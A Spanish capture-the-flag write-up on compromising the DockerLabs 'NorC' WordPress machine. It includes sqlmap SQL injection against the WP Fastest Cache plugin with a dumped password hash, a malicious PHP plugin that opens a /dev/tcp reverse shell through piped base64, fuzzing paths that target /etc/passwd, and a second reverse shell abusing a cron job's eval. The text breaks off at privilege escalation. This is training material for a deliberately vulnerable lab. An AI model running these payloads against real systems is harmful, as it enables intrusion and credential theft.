---
icon: flag
---

# NorC DockerLabs (Hard)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip norc.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh norc.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 10:30 EST
Nmap scan report for 172.17.0.2
Host is up (0.000035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 8c:5c:7b:fe:79:92:7a:f9:85:ec:a5:b9:27:25:db:85 (ECDSA)
|_  256 ba:69:95:e3:df:7e:42:ec:69:ed:74:9e:6b:f6:9a:06 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Did not follow redirect to http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
```

Si nos conectamos a la pagina, no cargara, veremos en la `URL` que esta intentando acceder mediante un dominio llamado `norc.labs` por lo que vamos a registrarlo:

```shell
nano /etc/hosts

#Dentro del nano
<IP>        norc.labs
```

Lo guardamos y ahora vamos acceder a el de nuevo, veremos que si carga y veremos que de primeras nos aparece un panel en el que meter una `password`.

Pero si inspeccionamos el codigo, vemos esta seccion de aqui:

```html
<p class="submit">
			<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" tabindex="100" />
			<input type="hidden" name="password_protected_cookie_test" value="1" />
			<input type="hidden" name="password-protected" value="login" />
			<input type="hidden" name="redirect_to" value="http://172.17.0.2/" />
		</p>
```

Sobre todo donde pone `wp-submit` podemos ver que esta utilizando `wp` por lo que podemos deducir que tiene un `wordpress` instalado, vamos a probar metiendo lo siguiente:

```
URL = http://norc.labs/wp-admin
```

Y vemos que efectivamente nos lleva al panel de `wordpress` de login, probaremos con las credenciales por defecto.

Pero veremos que no funcionan, tambien veremos que tenemos solamente 3 intentos, por lo que no podremos realizar fuerza bruta, vamos a identificar si hubiera algun `plugin` en el `wordpress`, que pueda ser vulnerable.

Vamos a realizar un poco de `fuzzing` ya que no podremos utilizar la herramienta `wpscan`.

## Gobuster

```shell
gobuster dir -u http://norc.labs/ -w <WORDLIST> -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://norc.labs/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                ../../Downloads/wp-fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.........................................................................
/wp-content/plugins/ungallery/source_vuln.php?pic=/../../../../../../../../../../../../../../../../etc/passwd (Status: 403) [Size: 199]
/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd (Status: 403) [Size: 199]
/wp-content/plugins/wp-fastest-cache/readme.txt (Status: 200) [Size: 16210]
/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../../../../../../etc/passwd (Status: 403) [Size: 199]
/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd (Status: 403) [Size: 199]
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd (Status: 403) [Size: 199]
/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=/etc/passwd (Status: 403) [Size: 199]
/wp-content/plugins/xcloner-backup-and-restore/cloner.cron.php?config=/../../../../../../../../../../../../../../../../etc/passwd (Status: 403) [Size: 199]
/wp-content/themes/nestle-action-stations/functions/site/force-download.php?file=../../../../../../../../../../../../../../../../etc/passwd (Status: 403) [Size: 199]
/wp-content/themes/sgfc2017/functions/site/force-download.php?file=../../../../../../../../../../../../../../../../etc/passwd (Status: 403) [Size: 199]
/wp-json/trx_addons/V2/get/sc_layout?sc=wp_insert_user&role=administrator&user_login=admin&user_pass=admin (Status: 401) [Size: 113]
/wp-content/upgrade/upgrade.php (Status: 200) [Size: 2568]
Progress: 6571 / 6571 (100.00%)
```

Vemos que encontro un `plugin` llamado `wp-fastest-cache` vamos a ver que version tiene y buscar un `exploit` para el mismo si lo tuviera.

```
URL = http://norc.labs/wp-content/plugins/wp-fastest-cache/readme.txt
```

Vemos que tiene la siguiente version:

```
=== WP Fastest Cache ===
Contributors: emrevona
Donate link: https://profiles.wordpress.org/emrevona/
Tags: cache, Optimize, performance, wp-cache, core web vitals
Requires at least: 3.3
Tested up to: 6.4
Stable tag: 1.2.1
License: GPLv2 or later
License URI: https://www.gnu.org/licenses/gpl-2.0.html
```

Vemos que tiene la version `1.2.1` y si buscamos un exploit, veremos el siguiente:

URL = [Exploit Info Plugin](https://pentest-tools.com/vulnerabilities-exploits/wp-fastest-cache-122-unauthenticated-sql-injection_22453)

Vemos que se le puede realizar un `SQL Injection` gracias a este `Plugin`, por lo que tendremos que hacer lo siguiente:

## SQL Injection

Veremos la informacion del `PoC` en el siguiente link:

URL = [Info PoC SQL Injection Plugin Wodpress](https://github.com/motikan2010/CVE-2023-6063-PoC)

```shell
sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 --schema
```

Info:

```
       ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.11#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:09:22 /2025-01-18/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] 

[11:09:24] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[11:09:24] [WARNING] provided value for parameter 'wordpress_logged_in' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[11:09:24] [INFO] testing connection to the target URL
got a 302 redirect to 'http://norc.labs'. Do you want to follow? [Y/n] 

[11:09:25] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:09:25] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] 

[11:09:26] [WARNING] please consider usage of tamper scripts (option '--tamper')
[11:09:26] [INFO] testing if the target URL content is stable
[11:09:27] [WARNING] (custom) HEADER parameter 'Cookie #1*' does not appear to be dynamic
do you want to URL encode cookie values (implementation specific)? [Y/n] 

[11:09:29] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter 'Cookie #1*' might not be injectable
[11:09:29] [INFO] testing for SQL injection on (custom) HEADER parameter 'Cookie #1*'
[11:09:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:09:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[11:09:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[11:09:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:09:32] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[11:09:32] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[11:09:32] [INFO] testing 'Generic inline queries'
[11:09:32] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[11:09:34] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[11:09:34] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[11:09:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[11:09:36] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[11:09:38] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[11:09:38] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[11:09:38] [INFO] testing 'MySQL inline queries'
[11:09:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[11:09:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:10:10] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? [Y/n] 

[11:10:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:10:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:10:14] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[11:10:17] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[11:10:19] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[11:10:21] [INFO] checking if the injection point on (custom) HEADER parameter 'Cookie #1*' is a false positive
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 205 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: wordpress_logged_in=" AND (SELECT 9724 FROM (SELECT(SLEEP(5)))IDCZ) AND "NyJG"="NyJG
---
[11:11:40] [INFO] the back-end DBMS is MySQL
[11:11:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:11:56] [INFO] enumerating database management system schema
[11:11:56] [INFO] fetching database names
[11:11:56] [INFO] fetching number of databases
[11:11:56] [INFO] retrieved:
[11:12:27] [INFO] adjusting time delay to 1 second due to good response times
2
[11:12:27] [INFO] retrieved: information_schema
[11:15:33] [INFO] retrieved: wordpress
[11:17:14] [INFO] fetching tables for databases: 'information_schema, wordpress'
[11:17:14] [INFO] fetching number of tables for database 'information_schema'
[11:17:14] [INFO] retrieved: 79
[11:17:30] [INFO] retrieved: ALL_PLUGINS
[11:19:35] [INFO] retrieved: APPLICABLE_ROLES
[11:22:16] [INFO] retrieved: CHARACTER_SETS
[11:24:26] [INFO] retrieved: CHECK_CONSTRAINTS
[11:27:04] [INFO] retrieved: COLLATIONS
[11:28:46] [INFO] retrieved: COLLATION_CHA^C
[11:30:01] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 1 times
```

Vemos que tiene `79` tablas, por lo que seria una locura esperar todo eso, vamos a ir al grano ya que nos interesa la base de datos de `Wordpress`, por lo que vamos a utilizar la base de datos por defecto a ver si cuela:

```shell
sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 -D wordpress -T wp_users --dump --batch
```

Info:

```
       ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.11#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org                                                                                                                
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:31:46 /2025-01-18/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[11:31:46] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[11:31:46] [WARNING] provided value for parameter 'wordpress_logged_in' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[11:31:46] [INFO] testing connection to the target URL
got a 302 redirect to 'http://norc.labs'. Do you want to follow? [Y/n] Y
[11:31:46] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: wordpress_logged_in=" AND (SELECT 9724 FROM (SELECT(SLEEP(5)))IDCZ) AND "NyJG"="NyJG
---
[11:31:46] [INFO] testing MySQL
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[11:32:05] [INFO] confirming MySQL
[11:32:05] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[11:32:35] [INFO] adjusting time delay to 1 second due to good response times
[11:32:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[11:32:35] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
[11:32:35] [INFO] retrieved: 10
[11:32:46] [INFO] retrieved: ID
[11:33:03] [INFO] retrieved: user_login
[11:35:00] [INFO] retrieved: user_pass
[11:36:41] [INFO] retrieved: user_nicename
[11:38:50] [INFO] retrieved: user_email
[11:40:32] [INFO] retrieved: user_url
[11:42:06] [INFO] retrieved: user_registered
[11:44:37] [INFO] retrieved: user_activation_key
[11:47:59] [INFO] retrieved: user_status
[11:50:00] [INFO] retrieved: display_name
[11:52:08] [INFO] fetching entries for table 'wp_users' in database 'wordpress'
[11:52:08] [INFO] fetching number of entries for table 'wp_users' in database 'wordpress'
[11:52:08] [INFO] retrieved: 1
[11:52:12] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                     
1
[11:52:22] [INFO] retrieved: admin
[11:53:08] [INFO] retrieved: 
[11:53:09] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[11:53:09] [INFO] retrieved: admin@oledockers.norc.labs
[11:57:40] [INFO] retrieved: admin
[11:58:26] [INFO] retrieved: admin
[11:59:13] [INFO] retrieved: $P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6.
[12:06:42] [INFO] retrieved: 2024-07-01 18:07:01
[12:10:17] [INFO] retrieved: 0
[12:10:33] [INFO] retrieved: http://norc.labs
[12:13:44] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[12:13:44] [INFO] using hash method 'phpass_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/smalldict.txt' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[12:13:44] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[12:13:44] [INFO] starting dictionary-based cracking (phpass_passwd)
[12:13:44] [INFO] starting 8 processes 
[12:13:52] [WARNING] no clear password(s) found                                                                                                             
Database: wordpress
Table: wp_users
[1 entry]
+----+------------------+------------------------------------+----------------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url         | user_pass                          | user_email                 | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+------------------+------------------------------------+----------------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://norc.labs | $P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6. | admin@oledockers.norc.labs | admin      | 0           | admin        | admin         | 2024-07-01 18:07:01 | <blank>             |
+----+------------------+------------------------------------+----------------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

[12:13:52] [INFO] table 'wordpress.wp_users' dumped to CSV file '/root/.local/share/sqlmap/output/norc.labs/dump/wordpress/wp_users.csv'
[12:13:52] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/norc.labs'

[*] ending @ 12:13:52 /2025-01-18/
```

Vemos que ha funcionado, a parte tambien veremos la informacion de la base de datos de `wordpress` viendo unas credenciales tambien, las cuales probaremos en el propio login.

```
User: admin
Pass: $P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6.
```

Si nosotros intentamos `crackear` ese `hash` `MD5` veremos que no podemos, pero nos fijamos en que obtuvimos esta informacion de aqui `admin@oledockers.norc.labs` parece ser que hay un `subdominio`, por lo que veremos que contiene de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           norc.labs oledockers.norc.labs
```

Lo guardamos y ahora nos vamos a esa parte del `subdominio`.

```
URL = http://oledockers.norc.labs/
```

Veremos lo siguiente cuando entremos:

```
Inbox
----------------------------------------------------------------------------------
From: admin@oledockers.norc.labs
Subject: Password Reminder
Hi, this is just in case I forget my password -> admin:wWZvgxRz3jMBQ ZN <--
----------------------------------------------------------------------------------
```

Vemos que la `password` del usuario `admin` es `wWZvgxRz3jMBQ ZN` por lo que probaremos a entrar desde el panel de `wordpress` con dichas credenciales.

## Escalate user www-data

```
User: admin
Pass: wWZvgxRz3jMBQ ZN
```

Vemos que si nos deja y estaremos dentro del `Wordpress` en el panel de administrador.

Crearemos nosotros un plugin de `wordpress` con una `reverse shell` dentro del ella, de la siguiente forma:

```shell
echo "bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" | base64
```

> plugin.php

```shell
nano plugin.php

#Dentro del nano
<?php
/*
Plugin Name: HACKEADO
Description: Plugin para ejecutar comandos del sistema a través de la URL (solo en entorno controlado).
Version: 66666666.0
Author: d1se0
*/
?>

<?php
system("echo 'Base64ReverShell' | tee /tmp/shell; base64 -d /tmp/shell | bash");
?>
```

```shell
zip plugin.zip plugin.php
```

Nos vamos a `Plugins` -> `Añadir nuevo plugin` -> `Subir Plugin` -> Dentro de esta seccion le daremos a `Browser...` para seleccionar nuestro plugin malicioso.

Una vez seleccionado y subido, le daremos a `Instalar ahora`, despues le damos otra vez a `plugins` y nos aparecera el nuestro, antes de activarlo estaremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y ahora si le daremos al boton `Activar` y volvemos a la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 54120
bash: cannot set terminal process group (30): Inappropriate ioctl for device
bash: no job control in this shell
www-data@c103b3df70e5:/var/www/norc.labs/wp-admin$ whoami
whoami
www-data
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user kvzlx

Si nos vamos a la `home` de `kvzlx` veremos un archivo bastante interesante llamado `.cron_script.sh` que si lo leemos veremos lo siguiente:

```bash
#!/bin/bash
ENC_PASS=$(cat /var/www/html/.wp-encrypted.txt)
DECODED_PASS=$(echo $ENC_PASS | base64 -d)

echo $DECODED_PASS > /tmp/decoded.txt

eval "$DECODED_PASS"
```

Vemos que esta decodificando su propia `password` en `/tmp` sin ningun tipo de sanitizacion, pero si nos vamos a la carpeta `/tmp`, veremos el archivo `decoded.txt` pero si lo leemos no lleva nada dentro, por lo que algo no esta ejecutando bien.

Tambien podemos observar que puede ser que se este ejeuctando un `crontab` cada cierto tiempo sobre ese archivo, vamos a investigar mas en los procesos a ver que esta pasando.

Si hacemos `ps -aux` no veremos mucho mas, por lo que utilizaremos la herramienta `pspy64` que nos ayudara a todo esto, para ver de mejor forma que esta pasando de forma interna.

En nuestro `host` nos descargaremos la herramienta:

URL = [Download pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)

Una vez que la tengamos en nuestro `host` abriremos un servidor de `python3` para pasarnos el archivo a la maquina victima:

```shell
python3 -m http.server
```

Y en la maquina victima haremos lo siguiente:

```shell
cd /tmp
wget http://<IP>:8000/pspy64
```

Una vez que nos lo hayamos pasado, le pondremos permisos de ejecuccion de la siguiente forma:

```shell
chmod +x pspy64
```

Y ahora lo ejecutamos:

```shell
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/01/19 10:46:34 CMD: UID=33    PID=742    | ./pspy64 
2025/01/19 10:46:34 CMD: UID=33    PID=516    | bash 
2025/01/19 10:46:34 CMD: UID=33    PID=515    | sh -c bash 
2025/01/19 10:46:34 CMD: UID=33    PID=514    | script /dev/null -c bash 
2025/01/19 10:46:34 CMD: UID=33    PID=472    | /bin/bash -i 
2025/01/19 10:46:34 CMD: UID=33    PID=471    | /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.5.186/7777 0>&1 
2025/01/19 10:46:34 CMD: UID=33    PID=470    | bash 
2025/01/19 10:46:34 CMD: UID=33    PID=466    | sh -c echo 'L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41LjE4Ni83Nzc3IDA+JjEnCg==' | tee /tmp/shell; base64 -d /tmp/shell | bash 
2025/01/19 10:46:34 CMD: UID=33    PID=363    | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=33    PID=304    | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=33    PID=303    | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=33    PID=302    | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=0     PID=270    | tail -f /dev/null 
2025/01/19 10:46:34 CMD: UID=0     PID=264    | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
2025/01/19 10:46:34 CMD: UID=0     PID=211    | logger -t mysqld -p daemon error 
2025/01/19 10:46:34 CMD: UID=100   PID=210    | /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock                                                                            
2025/01/19 10:46:34 CMD: UID=0     PID=83     | /bin/sh /usr/bin/mysqld_safe 
2025/01/19 10:46:34 CMD: UID=0     PID=48     | /usr/sbin/cron 
2025/01/19 10:46:34 CMD: UID=33    PID=39     | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=33    PID=38     | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=33    PID=37     | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=33    PID=36     | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=33    PID=35     | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=0     PID=30     | /usr/sbin/apache2 -k start 
2025/01/19 10:46:34 CMD: UID=0     PID=1      | /bin/sh -c a2enmod rewrite &&     service apache2 restart &&     service cron start &&     service apache2 start &&     service mariadb start &&     service ssh start &&     setfacl -m u:www-data:0 /opt/python3 &&     tail -f /dev/null
2025/01/19 10:47:01 CMD: UID=0     PID=753    | /usr/sbin/CRON 
2025/01/19 10:47:01 CMD: UID=0     PID=754    | /usr/sbin/CRON 
2025/01/19 10:47:01 CMD: UID=1000  PID=755    | 
2025/01/19 10:47:01 CMD: UID=1000  PID=756    | /bin/bash /home/kvzlx/.cron_script.sh 
2025/01/19 10:47:01 CMD: UID=1000  PID=759    | 
2025/01/19 10:47:01 CMD: UID=1000  PID=757    | /bin/bash /home/kvzlx/.cron_script.sh 
2025/01/19 10:47:01 CMD: UID=0     PID=760    | /usr/sbin/CRON 
2025/01/19 10:47:01 CMD: UID=101   PID=761    | 
2025/01/19 10:47:01 CMD: UID=1000  PID=762    | /usr/sbin/exim4 -Mc 1tZSpZ-0000CG-2C
2025/01/19 10:48:01 CMD: UID=0     PID=768    | /usr/sbin/CRON 
2025/01/19 10:48:01 CMD: UID=0     PID=769    | /usr/sbin/CRON 
2025/01/19 10:48:01 CMD: UID=1000  PID=770    | /bin/sh -c /home/kvzlx/.cron_script.sh 
2025/01/19 10:48:01 CMD: UID=1000  PID=771    | /bin/bash /home/kvzlx/.cron_script.sh 
2025/01/19 10:48:01 CMD: UID=1000  PID=774    | 
2025/01/19 10:48:01 CMD: UID=1000  PID=772    | /bin/bash /home/kvzlx/.cron_script.sh 
2025/01/19 10:48:01 CMD: UID=0     PID=775    | /usr/sbin/CRON 
2025/01/19 10:48:01 CMD: UID=101   PID=776    | 
2025/01/19 10:48:01 CMD: UID=1000  PID=777    | /usr/sbin/exim4 -Mc 1tZSqX-0000CV-2J 
2025/01/19 10:49:01 CMD: UID=0     PID=779    | /usr/sbin/CRON 
2025/01/19 10:49:01 CMD: UID=0     PID=780    | /usr/sbin/CRON 
2025/01/19 10:49:01 CMD: UID=1000  PID=781    | /bin/sh -c /home/kvzlx/.cron_script.sh 
2025/01/19 10:49:01 CMD: UID=1000  PID=782    | cat /var/www/html/.wp-encrypted.txt 
2025/01/19 10:49:01 CMD: UID=1000  PID=783    | /bin/bash /home/kvzlx/.cron_script.sh 
2025/01/19 10:49:01 CMD: UID=1000  PID=785    | 
2025/01/19 10:49:01 CMD: UID=0     PID=786    | /usr/sbin/CRON 
2025/01/19 10:49:01 CMD: UID=0     PID=787    | 
2025/01/19 10:49:01 CMD: UID=1000  PID=788    | /usr/sbin/exim4 -Mc 1tZSrV-0000Cg-2S
```

Vemos que si esperamos un rato a que el `cron` se ejecute nos muestra lo que esta sucediendo a bajo nivel.

Para ello tendremos que esperar un rato, hasta que podremos observar lo siguiente:

```
2025/01/19 10:49:01 CMD: UID=1000  PID=782    | cat /var/www/html/.wp-encrypted.txt
```

Vemos que esta intentando leer el archivo `.wp-encrypted.txt`, vamos a ver que hay en dicho archivo.

Pero si entramos vemos que no hay ningun archivo, podemos nosotros crear el archivo, ya que no se esta aplicando ningun tipo de sanitizacion, lo que va hacer es que va a decodificar el `base64` que nosotros le metamos al archivo y lo va a ejecutar, por lo que haremos lo siguiente:

Nos vamos a nuestro `host` y codificamos la `reverse shell` en `base64`:

```shell
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"| base64
```

Info:

```
L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41LjE4Ni83NzU1
IDA+JjEnCg==
```

Ahora en la maquina victima, pondremos lo siguiente:

```shell
nano /var/www/html/.wp-encrypted.txt

#Dentro del nano
L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41LjE4Ni83NzU1IDA+JjEnCg==
```

Lo guardamos y seguidamente nos pondremos a la escucha en nuestro `host`:

```shell
nc -lvnp <PORT>
```

Solo tendremos que esperar un ratito y veremos lo siguiente en la escucha:

```
listening on [any] 7755 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 48630
bash: cannot set terminal process group (945): Inappropriate ioctl for device
bash: no job control in this shell
kvzlx@c103b3df70e5:~$ whoami
whoami
kvzlx
```

Vemos que ya somos el usuario `kvzlx`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si vemos las `capabilities` que tiene el usuario, veremos lo siguiente:

```shell
